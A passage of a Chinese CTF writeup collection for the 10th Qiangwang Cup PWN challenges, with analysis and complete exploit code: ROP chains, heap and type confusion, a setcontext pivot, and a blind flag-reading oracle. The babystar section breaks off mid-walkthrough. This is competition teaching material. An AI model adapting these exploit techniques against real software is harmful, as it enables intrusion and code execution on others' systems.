---
title: 【微信】第十届“强网杯”全国网络安全挑战赛初赛PWN WP（一）
source: https://mp.weixin.qq.com/s/eXnvkaHGkgHpWPdFFXQzmg
source_host: mp.weixin.qq.com
clip_date: 2026-11-01T20:05:04+08:00
trace_id: 0a634971-78f2-4dcc-b6b0-c738aa4f23a9
content_hash: 174c23e949bb4f9b6ed7614014b3de1e663d6792fda53129cc0dff4f5ca23935
status: synced
tags:
  - 微信
  - CTF
  - 漏洞分析
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: 第十届强网杯初赛PWN题解：覆盖OCaml虚拟机、ArkJS运行时、V8、Firefox、KVM内核与Windows驱动等17道题的漏洞成因与完整利用链。
ai_summary_style: key-points
images_status:
  total: 1
  succeeded: 1
  failed_urls: []
notion_page_id: 40b75244-d011-8184-898c-f985d8f1cab3
ioc:
  cves:
    - CVE-2026-98260
  cwes: []
  hashes:
    - 1401518dc5d7641ccd41593a5d812410
    - 1ec6896ee054f9cab370a5a8473c30ee
    - 39e1895599f72e453332331ab83b08eb
    - 59b5c4b55e2a5c09dec66bb3aad099ae
    - bff14d2d1ca2da67f016aaa0cb38b975
    - dcb3b5ee9fc0a77b3dfcc6934a738a99
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> 第十届强网杯初赛PWN题解：覆盖OCaml虚拟机、ArkJS运行时、V8、Firefox、KVM内核与Windows驱动等17道题的漏洞成因与完整利用链。
> 
> - **赛题规模：** 线上初赛共41题（Misc 6、Crypto 6、Reverse 3、PWN 17、Web 9），最热题ELFStudy有1434队解出，crp-11741无人解出；PWN题以附件+靶机混合形态为主。
> - **VM/解释器类：** babel（OCaml字节码VM）存在空串1字节越界与setext校验写错两个漏洞，借GC压缩遗留陈旧偏移泄PIE并实现任意读写，seccomp白名单下用ROP读/flag；babyark的ldlexvar/stlexvar缺边界检查，wide指令slot可达65535，越界读写约512KB。
> - **浏览器/JIT类：** Babyv8因补丁致loop phi类型混淆且缺write barrier引发UAF，伪造JSArray后借FeedbackCell缓存入口劫持控制流；What The Fox!用JIT类型混淆与同步XHR嵌套事件循环触发UAF，setcontext转execve执行/readflag。
> - **内核/驱动类：** shadowledger在KVM VM fd上实现账本状态机，renew/revoke不撤销缓存指针形成UAF，用MAC oracle按1比特判定枚举KASLR并提权；Ironclad（Windows驱动）对象读缓存仅按槽号比对，跨会话resize致UAF，SipHash oracle伪造MAC实现任意内核读写并窃取System token。
> - **其他思路：** bad_puppet叠加装备表指针未摘除与交易队列克隆/释放错位的双重UAF；babysilent靠连接存活盲读逐字节猜flag；babystar篡改卫星测控表把CF请求搬进遥测载荷回传flag。

**星宇Sec** *2026年11月1日 19:45*

PWN

为深入贯彻习近平总书记关于网络强国的重要思想，特别是习近平总书记关于网络安全工作“四个坚持”的重要指示精神，贯彻落实全国网络安全和信息化工作会议精神，创新网络安全人才培养模式，在中央网信办、河南省人民政府指导下，河南省委网信办、河南省教育厅、郑州市人民政府、信息工程大学、郑州大学联合主办第十届“强PWN杯”全国网络安全挑战赛，并于今日12:00正式完赛。 ![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/c759bc8aefa3a857.png)

本次强PWN杯线上初赛共41道题目，其中Misc 6道、Crypto 6道、Reverse 3道、PWN 17道、Web 9道。按比赛解题总榜数据，各题解出队伍数如下：

-   **Misc（6道）**
    

-   宇宙微波背景辐射：801队
    
-   0perator：285队
    
-   NeuronShuffle：630队
    
-   谍影重重7：406队
    
-   Dreambound：429队
    
-   问卷调查：895队（非技术题）
    

-   **Crypto（6道）**
    

-   frozen：874队
    
-   vmshare：899队
    
-   hoRRibleRing：606队
    
-   zkRSA：210队
    
-   crp-12025：272队
    
-   crp-11741：0队
    

-   **Reverse（3道）**
    

-   ELFStudy：1434队
    
-   firmware：438队
    
-   license：473队
    

-   **PWN（17道）**
    

-   babel：414队
    
-   babyark：399队
    
-   babysilent：538队
    
-   babystar：329队
    
-   Babyv8：282队
    
-   bad_puppet：180队
    
-   Blackout：167队
    
-   drywell：215队
    
-   easytl：1059队
    
-   HESEUS：196队
    
-   oldsvr：605队
    
-   ez_qemu：191队
    
-   CanonicoPWN：264队
    
-   hexachord：10队
    
-   What The Fox!：161队
    
-   shadowledger：273队
    
-   Ironclad：60队
    

-   **Web（9道）**
    

-   BlindReview：12队
    
-   cwp：1340队
    
-   ezphp：760队
    
-   ezstar：279队
    
-   ezcms：467队
    
-   Crack a Little Smile：231队
    
-   fault_web_and_fault_hash：133队
    
-   vaultlink：1065队
    
-   vaultlink_revenge：150队
    

## 第十届“强PWB杯” PWN 方向题解合集

本文整理本次比赛PWN方向的17道题，按题目顺序给出分析与关键利用代码。

## PWN1-babel

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | PWN |
| 形态  | 混合题（附件+靶机） |
| 附件  | babel.zip（babel可执行文件、Dockerfile） |
| 目标  | 容器  |

Flag：flag{动态容器已脱敏}

### 2\. 题目分析

`babel` 是OCaml编译的自研字节码虚拟机，stripped、PIE、Full RELRO、NX。 `main` （0xd710）初始化后装 `PR_SET_NO_NEW_PRIVS` 与seccomp，白名单为 `read write close openat exit exit_group brk rt_sigprocmask` ，无 `execve` ，预期用ROP读 `/flag` 。主循环 `read(0,4)` 取长度、 `read(0,len)` 读进0x65e40的64KB缓冲区，再调 `babel_dispatch` （0xdb80）；值栈、256个寄存器与1MB堆跨chunk保留，利用可拆成多次投递。分发表在0x75f60，合法输入字节仅 `0x00..0x19` 、 `0x20` 、 `0xfe` 、 `0xff` 。

值编码(堆偏移<<4)|tag：1 string、3 array、5 tuple、7 ref、9 buffer、偶数为整数（ `n>>1` ）。对象头 `+0` 为type（1=array、2=tuple、6不被扫描）、 `+8` size、 `+0x10` count、 `+0x14` len|0x80000000、 `+0x18` dataOff；tag-9数据在另一块4MB区（指针在0x76270）。关键指令： `0x01` push imm64、 `0x08` 造array、 `0x0a/0x0b` 元素get/set、 `0x14` 造ref并将 `+0x18` 写绝对地址 `base+0x59098+8*kind` 、 `0x16` alloc、 `0x17/0x18` 经 `ext[slot]` 读写、 `0x19` 设ext、 `0x20` 调宿主函数。3个宿主函数（ `base+0x11de0` 起）会回调dispatch并在堆上分配对象。

GC在0xe710， `cursor+size+0x10>cursor+0x8000` 时触发，根为值栈（0x97290，个数在0x97288）、寄存器区0x9f290与临时区。只标记type1/2的对象后整体左移压缩并重写根值。type6不被扫描，其子对象即使有引用也判成垃圾；被压缩对象留在不扫描区的陈旧偏移不清理，压缩后的活对象可能正好落到该偏移上。

漏洞一，空串1字节越界： `0x31` 在长度为0时把size算成0x10，却写长度 `1|0x80000000` 、 `dataOff=off+0x20` ，指向下一个对象的header。 `sset(0)` 通过 `idx<len` 检查，可把下一个array的type改成6，让GC跳过它的元素。

漏洞二，setext检查写错： `0x1e` 本应校验 `+0x14==0xffffffff` ，实际只查 `tag==9` 并要求 `+0x14==-1` 、 `+0x18<0x10` 。alloc出的tag-9对象 `+0x14` 是size，正常路径走不通；让tag-9值指向array（ `+0x14` 即-1、首元素偏移<0x10）即可通过， `ext[slot]={addr,0x100000}` ， `extget/extset` 变成任意地址按字节读写。

### 3\. 解题过程

1.  泄漏PIE。chunk1在0x00造 `U` =array(1)并丢弃引用，0x20造 `R` =ref(1)（ `+0x18=base+0x590a0` ），0x40造空串 `E` （ `dataOff=0x60` ），0x60造 `V` =array(1)（元素0为 `U` ）。用 `E` 把 `V` 的type改成6，压约32KB字符串触发GC： `U` 无根被压缩掉， `R` 从0x20左移到0x00， `V[0]` 的旧偏移0正好指向 `R` 。
    
2.  chunk2执行 `pushr(3); getf(0); getf(0); raw` ， `V[0]` 取出 `(0<<4)|3` ，再取元素0读到 `R+0x18=base+0x590a0` ， `base=leak-0x590a0` ，校验页对齐。
    
3.  同法制造tag9指向array：0xC0造 `B` =alloc(0x100)，0xC0+0x20造 `T` =array(1)，0xC0+0x40造空串 `E2` （ `dataOff=0xC0+0x60` ），0xC0+0x60造 `V2` =array(1)（元素0为 `B` ）；丢 `B` 的引用、用 `E2` 把 `V2` 的type改成6， `pushstr(b'Y'*0x8100)` 触发GC后 `B` 死亡、 `T` 落到0xC0， `V2[0]` 读出 `(0xC0<<4)|9` 。
    
4.  任意读写。混淆值留在寄存器7，每次 `pushr(7); getf(0); pushraw(addr); setext` 重设 `ext[0]` ，再批量 `extget(i)` / `extset(i)` 。
    
5.  泄漏libc。 `read@GOT` 在 `base+0x58d30` ，读出后减0x11bd20得libc基址，回读 `\x7fELF` 校验。
    
6.  拼ROP。链为 `close(0); open("/flag"); gets(buf); puts(buf); exit(0)` ：关fd0后 `open` 返回0， `gets` 避开被 `open` 破坏的 `rdx` 。命令串、缓冲区与链写在 `base+0x100000` 的`.bss` 。
    
7.  劫持控制流。值栈个数在 `base+0x97288` ，在 `U=base+0x97290+8*count` 伪造ucontext： `+0xa0` 写链地址、 `+0xa8` 写 `ret` ；把ext表的宿主函数指针 `base+0x75ec0` 改成 `setcontext+0x3d` （ `mov rsp,[rdx+0xa0]` ），调用时 `rdx` 正是 `&value_stack[count]` 。发 `op 0x29` 、 `fn=0` 的chunk触发，flag从stdout输出。
    

| 名称  | 值   | 用途  |
| --- | --- | --- |
| ref\[0x18\] | base+0x590a0 | PIE泄漏 |
| read@GOT | base+0x58d30 | libc泄漏 |
| count/值栈 | base+0x97288 / 0x97290 | 伪造ucontext |
| ext指针 | base+0x75ec0 | setcontext+0x3d |
| read / setcontext | 0x11bd20 / 0x4a960 | 基址、pivot |
| pop rdi / pop rsi / ret | 0x10c08d / 0x110b7d / 0x10c08e | 传参、对齐 |
| open / close / gets / puts / exit | 0x11b3f0 / 0x1169b0 / 0x87160 / 0x87cc0 / 0x47ba0 | ROP |

### 4\. PoC

```python
from pwn import *
L = dict(read=0x11bd20, pivot=0x4a960 + 0x3d, pop_rdi=0x10c08d, pop_rsi=0x110b7d,
         ret=0x10c08e, open=0x11b3f0, close=0x1169b0, gets=0x87160,
         puts=0x87cc0, exit=0x47ba0)
p = remote(HOST, PORT)

pushraw = lambda v: b"\x01" + p64(v)
pushstr = lambda s: b"\x02" + p32(len(s)) + s
arr     = lambda n: b"\x08" + bytes([n])
getf    = lambda i: b"\x0a" + bytes([i])
sset    = lambda i: b"\x0d" + bytes([0, i])
mkref   = lambda k: b"\x14" + bytes([k])
alloc   = lambda n: b"\x16" + p32(n)
extget  = lambda i: b"\x17" + p32(i)
extset  = lambda i, b: b"\x18" + p32(i) + bytes([b])
setext  = lambda: b"\x19\x00"
rget    = lambda r: b"\x10" + bytes([r])
rset    = lambda r: b"\x11" + bytes([r])

def send(*ops):
    code = b"".join(ops)
    p.send(p32(len(code)) + code)

def rd(addr, n):
    send(rget(7), getf(0), pushraw(addr), setext(),
         *[x for i in range(n) for x in (extget(i), b"\x13")])
    return bytes(u64(p.recvn(8)) >> 1for _ in range(n))

def wr(addr, data):
    send(rget(7), getf(0), pushraw(addr), setext(),
         *[extset(i, c) for i, c in enumerate(data)])

## 1) 改type + GC，留下指向ref的陈旧偏移
send(pushraw(0), arr(1), rset(0), mkref(1), rset(1), pushstr(b""), rset(2),
     rget(0), arr(1), rset(3), pushraw(0), rset(0),
     rget(2), pushraw(6), sset(0), pushstr(b"Z" * 0x7f80))
send(rget(3), getf(0), getf(0), b"\x13")
base = u64(p.recvn(8)) - 0x590a0
assert base & 0xfff == 0

## 2) tag9->array混淆
send(b"\xfe")
send(pushstr(b"S" * 0x100), alloc(0x100), rset(4),
     pushraw(0), arr(1), rset(5), pushstr(b""), rset(6),
     rget(4), arr(1), rset(7), pushraw(0), rset(4),
     rget(6), pushraw(6), sset(0), pushraw(0), rset(6),
     pushstr(b"Y" * 0x8100))
send(rget(7), getf(0), b"\x13")
assert u64(p.recvn(8)) & 0xf == 9

## 3) libc基址
libc = u64(rd(base + 0x58d30, 8)) - L["read"]
assert libc & 0xfff == 0and rd(libc, 4) == b"\x7fELF"

## 4) ROP
r = lambda k: libc + L[k]
chain, buf = base + 0x100000, base + 0x100200
rop = flat(r("pop_rdi"), 0, r("close"), r("pop_rdi"), chain, r("pop_rsi"), 0,
           r("open"), r("pop_rdi"), buf, r("gets"), r("pop_rdi"), buf,
           r("puts"), r("exit"), 0)
wr(chain, b"/flag\x00".ljust(0x40, b"\x00") + rop)

## 5) 伪造ucontext，劫持ext指针
uc = base + 0x97290 + 8 * u64(rd(base + 0x97288, 8))
wr(uc + 0x88, p64(0x200) + b"\x00" * 0x10 + p64(chain) + p64(r("ret")))
wr(base + 0x75ec0, p64(libc + L["pivot"]))
send(b"\x20" + p32(0) + p32(0))
print(p.recvall(timeout=3).decode())
```

* * *

## PWN2-babyark

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | PWN |
| 形态  | 混合题（附件+靶机） |
| 附件  | babyark.zip（ark_js_vm、libark_jsruntime.so、libc.so.6、ld-linux-x86-64.so.2） |
| 目标  | 容器  |

Flag：flag{动态容器已脱敏}

### 2\. 题目分析

`ark_js_vm` 是官方样例宿主，只做 `JSNApi::CreateJSVM` 与 `JSNApi::Execute` ； `libark_jsruntime.so` 是OpenHarmony 7.0/API24运行时，abc版本24.0.0.0，libc为Ubuntu 24.04的2.39。运行时用 `--asm-interpreter` ，JIT关闭，无seccomp与namespace。`.abc` 是panda格式，加载只做结构解析，没有验证器， `CodeData` 的寄存器数、槽位与指令立即数之间无交叉校验。

漏洞在 `ldlexvar` / `stlexvar` （ `interpreter_assembly.cpp` ）： `level` 与 `slot` 直接取自指令立即数， `GetProperties(slot)` 转成 `TaggedArray::Get(slot+3)` ，边界检查只在release被裁掉的 `ASSERT` 里，实际地址为 `env+24+(slot+3)*8 = env+40+8*slot` 。短指令 `0x8a/0x8b` 的slot为8位，wide形式（前缀 `0xfd` 加 `0x0c/0x0d` ）可达65535，一条指令即以env为基址向前约512KB读写任意tagged value（对象指针、整数或double）。堆里各类对象连续分布，越界窗口能命中同一次分配序列的固定位置。

LexicalEnv： `+0` hclass、 `+8` length、 `+16` globalEnv、 `+24` parentEnv、 `+32` scopeInfo、 `+40` env\[0\]。对象布局：ECMAObject `hash@8` （SIZE=16）；JSArrayBuffer `data@32,byteLength@40` ；JSTypedArray `viewedBuffer@32,byteLength@40,byteOffset@44,arrayLength@48,type@52` ；ByteArray `arrayLength@8,byteLength@12,data@16` （内联）；TaggedArray `length@8,extraLength@12,data@16` ；JSNativePointer `externalPointer@8,deleter@16,data@24` 。 `u8.viewedBuffer` 存的是 `ab` 对象指针，取元素时才经 `ab.data` → `JSNativePointer.externalPointer` ，所以改 `ab.data` 不影响 `u8` 对 `ab` 的引用， `byteLength` 也拦不住伪造指针； `ByteArray` 数据内联在 `+16` ，不会被GC搬走，可当伪造对象工作区。

### 3\. 解题过程

1.  用 `es2abc` 编译模板abc： `outer()` 内用被闭包捕获的 `secret` 强制生成 `LexicalEnv` ，依次分配 `scr=new Uint8Array(0x200)` （堆内 `ByteArray` ，数据内联）、 `ab=new ArrayBuffer(0x100)` 、 `u8=new Uint8Array(ab)` 、 `vic=new ArrayBuffer(0x100)` ，再定义4个引用局部变量的探针 `p0` ~ `p3` ； `p3` 带参数并做加法，以分配到实参寄存器 `v4` 。bundle形式下默认entry即第一个record。
    
2.  闭包变量按声明顺序进env的slot，布局：slot 5为 `scr` 的ByteArray对象，slot 14为 `scr` 数据起点（ `env+40+8*14` 落在内联数据里），slot 82为 `ab.data` ，slot 92为 `ab` 对象指针。
    
3.  打补丁。指令编码 `ldlexvar=8a <level> <slot>` 、 `stlexvar=8b <level> <slot>` 、 `lda v8=60 <v>` 、 `return=64` ，level恒0。前三个探针体以 `ldlexvar 0,0; sta v0` （ `3c 00 61 00` ）开头，按出现顺序即 `p0` ~ `p2` ； `p3` 用 `62 01 00 00 00 61 00 62 02` 定位。替换为 `p0: ldlexvar 0,5; stlexvar 0,14` 、 `p1: ldlexvar 0,14; stlexvar 0,82` 、 `p2: ldlexvar 0,92; stlexvar 0,14` 、 `p3: lda v4; stlexvar 0,14` ，长度对齐。
    
4.  伪造NP： `p0()` 取回 `B` ，假NP放 `D=B+16` （scratch内联数据）， `D+8` 写目标地址； `p3(ab)` 得 `Aab` ， `wr(0,D); wr(8,Aab); p1()` 令 `ab.data` 指向 `D` ， `u8` 窗口落在 `ab` 本身。之后只改scratch `+8` 换目标，不能再动 `ab.data` 。
    
5.  泄漏： `wr(8,Avic); rdu(32)` 得 `vic` 的NP地址；窗口移到该NP后 `rdu(8)` 得native缓冲 `CB` （ROP载体）， `rdu(16)` 得 `deleter` = `FreeBufferFunc` ，减0x2504b40得libark；读 `libark+0x2acbbf8` 的 `execv@got` 减0xef010得libc，页对齐失败则改用 `free@got` （0x2ac07f8）减0xade30。GOT在 `GNU_RELRO` 内只读。
    
6.  析构迁移： `DestroyJSVM` → `~EcmaVM` → `ClearNativePointerList()` 对每个NP调 `Destroy()` ，执行 `deleter(env, externalPointer, data)` ， `data` 在 `rdx` 。在 `CB` 写命令串与 `pop rdi;ret` + `system` 链，把 `deleter` 改成 `libc+0x5ef6f` （ `mov rsp,rdx;ret` ）、 `data=CB` ，析构时栈切到 `CB` 。按 `(data+32)%16==8` 决定是否垫 `ret` ，payload也不能抛异常，否则走不到NP析构。
    

| 名称  | 值   |
| --- | --- |
| slot 5/14/82/92 | scr对象 / scr数据 / `ab.data` / `ab` |
| `FreeBufferFunc` | libark+0x2504b40 |
| `execv@got`<br><br>/ `free@got` | libark+0x2acbbf8 / libark+0x2ac07f8 |
| `execv`<br><br>/ `free` | libc+0xef010 / libc+0xade30 |
| `system`<br><br>/ `pop rdi; ret` / `ret` / `mov rsp,rdx; ret` | 0x58750 / 0x10c08d / 0x28a92 / 0x5ef6f |

### 4\. PoC

```rust
function outer() {
let secret = 111;                  // 生成LexicalEnv
let scr = newUint8Array(0x200);
let ab = newArrayBuffer(0x100);
let u8 = newUint8Array(ab);
let vic = newArrayBuffer(0x100);
let p0 = function(){ return secret; }, p1 = function(){ return secret; };
let p2 = function(){ return secret; };
let p3 = function(x){ let t = 1; t = t + 2; t = t + 3; return x; };
return [p0, p1, p2, p3, scr, ab, u8, vic];
}
let g = outer(), p0 = g[0], p1 = g[1], p2 = g[2], p3 = g[3];
let scr = g[4], ab = g[5], u8 = g[6], vic = g[7];
function rd(o){let v=0,m=1;for(let i=0;i<8;i++){v+=scr[o+i]*m;m*=256;}return v;}
function wr(o,v){let m=1;for(let i=0;i<8;i++){scr[o+i]=Math.floor(v/m)%256;m*=256;}}
function rdu(o){let v=0,m=1;for(let i=0;i<8;i++){v+=u8[o+i]*m;m*=256;}return v;}
function wru(o,v){let m=1;for(let i=0;i<8;i++){u8[o+i]=Math.floor(v/m)%256;m*=256;}}

// 探针：p0=scr进scratch，p1=scratch进ab.data，p3=addrof
p0(); let B = rd(0), D = B + 16;
p3(ab); let Aab = rd(0); p3(vic); let Avic = rd(0);
wr(0, D); wr(8, Aab); p1();                      // ab.data=假NP
wr(8, Avic); let vicNP = rdu(32);
wr(8, vicNP); let CB = rdu(8);
let libark = rdu(16) - 0x2504b40;
wr(8, libark + 0x2acbbf8); let libc = rdu(0) - 0xef010;
if (libc % 0x1000) { wr(8, libark + 0x2ac07f8); libc = rdu(0) - 0xade30; }

let POP_RDI = libc + 0x10c08d, RET = libc + 0x28a92;
let SYSTEM = libc + 0x58750, PIVOT = libc + 0x5ef6f;
let pad = ((CB + 32) % 16 == 8) ? [] : [RET];
let rop = [POP_RDI, CB + 0x40].concat(pad, [SYSTEM]);
wr(8, CB);
for (let i = 0; i < rop.length; i++) wru(i * 8, rop[i]);
let cmd = "cat /flag* /home/*/flag* /root/flag* 2>/dev/null";
for (let i = 0; i < cmd.length; i++) u8[0x40+i] = cmd.charCodeAt(i) & 0xff;
u8[0x40+cmd.length] = 0;
wr(8, vicNP);
wru(8, CB); wru(16, PIVOT); wru(24, CB);
```

* * *

## PWN3-babysilent

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | PWN |
| 形态  | 混合题（附件+靶机） |
| 附件  | pwn、wrapper、ld-linux-x86-64.so.2、libc.so.6 |
| 目标  | nc \* <TARGET_PORT> |

Flag：flag{动态容器已脱敏}

### 2\. 题目分析

保护：amd64、PIE、Canary、NX、Full RELRO；seccomp只允许 `read` 、 `exit` 、 `exit_group` 。 `open_flag()` 在 `blind()` 前打开 `flag` ，fd固定为3； `blind()` 关掉stdout/stderr并装seccomp，靠连接存活与否盲读。

`main` （0x200452）在 `rbp-0x60` 放0x58字节名字缓冲区，canary在 `rbp-8` ，输入上限0x88，可覆盖canary、saved rbp与saved rip；开头 `mov [rbp], rcx` 把 `__libc_csu_init` 存在saved rbp处，作为PIE泄露源。

`get_input(dest,count)` 逐字节 `read(0,&c,1)` ，EOF直接 `exit(-1)` ，读满count或遇换行停止，且不写NUL， `printf("Your name is: %s")` 会一直打印到内存中下一个0x00。

泄露：第一次名字输入 `0x58` 个 `A` 加 `B` ， `B` 覆盖canary最低字节0x00，printf越过canary打印7字节，再打印 `[rbp]` 处的地址； `canary=b"\x00"+leak[0x59:0x60]` ， `base=u64(leak[0x60:0x68])-0x2005a0` 。泄露不足0x60字节就重连。

### 3\. 解题过程

1.  第二次名字输入0x88字节： `A*0x58 + canary + p64(B+0x60) + p64(main+0x92) + A*0x18` ， `B=base+0x601080` 。 `blind()` 后 `leave;ret` 使 `rsp=rbp=B+0x60` 、 `pop rbp=B` 、 `ret` 到 `main+0x92` （0x2004e4），重走 `getnum` 与两次 `get_input` 。
    
2.  重入后 `getnum` 读走 `"136\n"+"A"*11` 返回136，两次 `get_input(B,136)` 写同一blob： `stage2.ljust(0x58,b"\0") + canary + p64(B) + p64(leave)` 。 `main` 再 `leave;ret` 两次， `rsp` 落到 `stage2[1]` 。
    
3.  stage2九个qword： `[0, pop_rdi, dst, pop_rsi_r15, len(payload), 0, get_input, pop_rsp, dst]` ，先 `get_input(dst,len)` 读入payload，再由 `pop rsp` 切栈到 `dst` ，前3个qword被 `pop r13/r14/r15` 吃掉。
    
4.  payload： `dst+0` 为链， `dst+0x220` 为accepted循环， `dst+0x320` 为伪 `get_input` 栈帧， `dst+0x380` 为256项函数表，总长0xb80。
    
5.  CSU组装oracle： `pop rbx/rbp/r12/r13/r14/r15;ret` （0x2005fa）设 `rbx=0,rbp=1,r12=read@got,r13=3,r14=buf,r15=count` 后跳 `call [r12+rbx*8]` （0x2005e0）。先 `read(3,scratch,offset)` 推进fd3偏移，再 `read(3,dst+slot*8,1)` 把flag字节写进下一组CSU pop的rbx槽最低字节（高7字节为0），得 `rbx=flag_byte` ；下一组设 `rbp=loop_area+16,r12=table` ， `call [table+flag_byte*8]` ：命中跳到 `leave;ret` 切到accepted循环，不命中 `call 0` 崩溃，连接被关。
    
6.  offset 10特判： `p64(10)` 最低字节是0x0a，会让 `get_input` 提前结束，拆成两次 `read(3,scratch,5)` 。
    
7.  accepted循环： `leave` 后 `rsp=loop_area+16` ， `pop rbp=0` 、 `ret=0x200180` ，再 `pop rbp=frame+13` 、 `pop rdi=0` 、 `pop rsi=frame;pop r15=0` ， `rdx` 仍为CSU设的1， `read@plt` 读1字节到 `frame` 后 `ret` 到0x200359做 `cmp rax,1;je` 。只有换行能正常收尾（canary校验后 `leave;ret` 回loop_area），EOF会 `exit(-1)` ，其他字节令 `get_input` 向NULL写而崩溃，心跳只发换行。
    
8.  判定：一次查询只回答 `flag[offset]` 是否属于集合S。hex位做4次bit测试（ `S={HEX[i] for i in range(16) if i&(1<<bit)}` ）拼出0..15，再用 `{candidate}` 精确验证，失败重试5轮后回退7位ASCII。flag{动态容器已脱敏}直接填入。
    

| 名称  | 偏移  |
| --- | --- |
| `main`<br><br>/ `main+0x92` / `get_input` / `getnum` | 0x200452/0x2004e4/0x20031c/0x2003aa |
| `open_flag`<br><br>/ `blind` / `__libc_csu_init` | 0x200409/0x20042d/0x2005a0 |
| CSU `pop*6;ret` / `call [r12+rbx*8]` | 0x2005fa/0x2005e0 |
| `leave;ret`<br><br>/ `pop rdi` / `pop rsi;pop r15` | 0x20059d/0x200603/0x200601 |
| `pop rbp;ret`<br><br>/ `get_input` 检查 | 0x200180/0x200359 |
| `read@plt`<br><br>/ `read@got` | 0x2000b0/0x600fa8 |
| 伪栈 `B` / `dst` /scratch | 0x601080/0x601400/0x6010d0 |

### 4\. PoC

```python
from pwn import *
CSU_POP, CSU_CALL, LEAVE = 0x2005fa, 0x2005e0, 0x20059d
POP_RDI, POP_RSI_R15, POP_RSP, POP_RBP = 0x200603, 0x200601, 0x2005fd, 0x200180
GET_INPUT, READ_PLT, READ_GOT, CSU_INIT = 0x20031c, 0x2000b0, 0x600fa8, 0x2005a0
MAIN_92, B, DST, SCRATCH = 0x2004e4, 0x601080, 0x601400, 0x6010d0

def parse_leak(io):
    data = io.recvuntil(b"Now you have")
    leak = data.split(b"Your name is: ")[1].rstrip(b"\n")
    canary = b"\x00" + leak[0x59:0x60]
    base = u64(leak[0x60:0x68].ljust(8, b"\x00")) - CSU_INIT
    return canary, base

def build_bit_oracle(base, canary, offset, selector):
    dst = base + DST
    loop_area, frame, table = dst + 0x220, dst + 0x320, dst + 0x380
    scratch = base + SCRATCH
    words = [0, 0, 0]

    def call_read(fd, addr, cnt):
        words.extend([base + CSU_POP, 0, 1, base + READ_GOT, fd, addr, cnt, base + CSU_CALL])
        words.extend([0] * 7)

    if offset == 10:                  # 0x0a会截断输入
        call_read(3, scratch, 5)
        call_read(3, scratch, 5)
    elif offset:
        call_read(3, scratch, offset)

    dest_index = len(words) + 5
    call_read(3, 0, 1)
    char_index = len(words) + 1
    words.extend([base + CSU_POP, 0, loop_area + 16, table, 0, 0, 1, base + CSU_CALL])
    words[dest_index] = dst + char_index * 8
    chain = flat(words)
    stage2 = [0, base + POP_RDI, dst, base + POP_RSI_R15, 0xb80, 0,
              base + GET_INPUT, base + POP_RSP, dst]
    blob = flat(stage2).ljust(0x58, b"\x00") + canary + p64(base + B) + p64(base + LEAVE)

    loop = b"\x00" * 16 + flat(0, base + POP_RBP, frame + 13, base + POP_RDI, 0,
                               base + POP_RSI_R15, frame, 0, base + READ_PLT, base + 0x200359)
    frame_bytes = b"\x00" * 5 + canary + b"\x00" * 8
    frame_bytes += p64(base + POP_RSP) + p64(loop_area)
    table_bytes = b"".join(p64(base + LEAVE if c in selector else0) for c in range(256))
    payload = bytearray(0xb80)
    payload[:len(chain)] = chain
    payload[0x220:0x220 + len(loop)] = loop
    payload[0x320:0x320 + len(frame_bytes)] = frame_bytes
    payload[0x380:] = table_bytes
    return blob, bytes(payload)

def probe(base, canary, offset, selector):
    io = remote(HOST, PORT)
    io.recvuntil(b"size")
    io.send(b"136\n" + b"A" * 11)
    io.recvuntil(b"name: ")
    io.send(b"A" * 0x58 + b"B")
    c, b = parse_leak(io)
    io.send(b"A" * 0x58 + c + p64(b + B + 0x60) + p64(b + MAIN_92) + b"A" * 0x18)
    blob, payload = build_bit_oracle(b, c, offset, selector)
    io.send(b"136\n" + b"A" * 11)
    io.send(blob + blob + payload)
    io.send(b"\n" * 4096)
    try:
        io.recv(timeout=2)
    except EOFError:
        returnFalse
    returnTrue
```

* * *

## PWN4-babystar

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | PWN |
| 形态  | 容器题（无附件） |
| 附件  | 无   |
| 目标  | 容器  |

Flag：flag{动态容器已脱敏}

### 2\. 题目分析

无附件，信息全来自线上协议：cFS风格卫星测控站，攻击面为三张可上传表 `HK.CopyTable` 、 `HS.MsgActs_Tbl` 、 `HS.AppMon_Tbl` 。表数据被当可信配置执行：拷贝表搬包、动作表发包、监控表触发，CF最终读 `/cf/host/flag` 回传。

链路帧kind(1B: C/F/T/E)+length(4B大端)+payload。 `C` 帧payload解成CCSDS包按APID投到总线，MID高字节即APID： `0x88` → `0x1888` ， `0xB3` → `0x18B3` 。写一条 `0x18B3` 即伪造遥测包。

CCSDS包8B主头+body： `0x1800|apid` 、序列控制 `0xC000` 、长度 `len(body)+1` 、功能码、校验（ `0xFF` 初值全包XOR，校验字节按0）。APID `0x04` 文件服务，功能码2加载、4校验、5激活； `0x9C` 功能码0发送指定MID。

表镜像=64B文件系统头（magic `cFE1` ）+52B表头（ `0,0,len` +40B表名）+数据区。数据区固定：CopyTable2048B（镜像2164）、MsgActs24B（140）、AppMon26B（142）。

`hk_entry` 16B= `<I H 2x I H H` ：input_mid、input_offset、output_mid、output_offset、count。前5条把HK参数搬到 `0x089C` 作伪装；第6条把 `0x1888` 偏移8的136B搬到 `0x18B3` 偏移8，CF请求体落进遥测载荷；第7条把 `0x1888` 偏移144的1B（carrier尾补的 `0x20` ）搬到 `0x18B3` 偏移6功能码，改成长度不符的MM NOOP，只需发出不需执行。

CF class 1请求136B= `<BBBBI64s64s` ：类型0、class1、通道1、优先级0、目的EID23、源 `/cf/host/flag` 、目的名 `flag` ，尾补 `0x20` 。class 1无ACK，目的EID取本星23自收自发。动作表记录 `<HH4x16s` =count1、0、4B填充、16B命令包 `ccsds(0x9C,0,<I 0x18B3)` 。监控表 `<20sHHH` = `NO_SUCH_APP` 、0、1、4，激活后首轮监控发现应用不存在即取动作表第0条执行。

HS表上传要过白名单：只看首个整文件PDU的表头名是否为 `HK.CopyTable` 。先发同长度封面（数据区全0，长度=真实长度-116），再发真内容覆盖同名文件，校验和按真内容。

### 3\. 解题过程

1.  上传 `hk_cf.tbl` ，APID `0x04` 加载 `/cf/uplink/<name>` 补64B，校验body为 `\0\0` +表名补40B，激活body为表名补40B。
    
2.  封面方式上传 `hs_mat_x.tbl` ，加载、校验、激活 `HS.MsgActs_Tbl` 。
    
